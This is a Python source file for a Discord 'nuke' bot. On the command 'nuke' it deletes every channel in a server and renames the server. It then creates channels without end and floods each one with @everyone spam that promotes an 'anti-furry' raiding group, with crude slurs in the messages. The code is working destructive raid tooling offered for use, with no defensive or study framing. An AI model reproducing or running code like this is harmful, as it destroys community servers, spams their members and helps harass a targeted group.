
import discord
import asyncio

bot = discord.Client(intents=discord.Intents.all())
client = discord.client
@bot.event
async def on_ready():

	guild_count = 0

	for guild in bot.guilds:
		print(f"- {guild.id} (name: {guild.name}) (id: {guild.id}) (Owner: {guild.owner})")

		guild_count = guild_count + 1

	print("Nuke is in " + str(guild_count) + " guilds.")


@bot.event
async def on_guild_channel_create(channel):
	while True:
		await channel.send("@everyone fucked by uar , https://discord.gg/uMF7bYWV https://tenor.com/view/anti-furry-afa-animated-antifur-gif-25154410")

@bot.event
async def on_message(message):
	if message.content == "nuke":
		await message.channel.send("```NUKE BOT ACTIVE```")
		guild = message.guild
		for channel in guild.channels:
			await channel.delete()
		await guild.edit(name="Fucked by UAR")
		await guild.create_role(name = "FUCKED BY UAR")
		while True:
			channel = await guild.create_text_channel('[fucked-by-the-UAR]')


bot.run("") #token
#UAR is united antifurry republic , join if you want
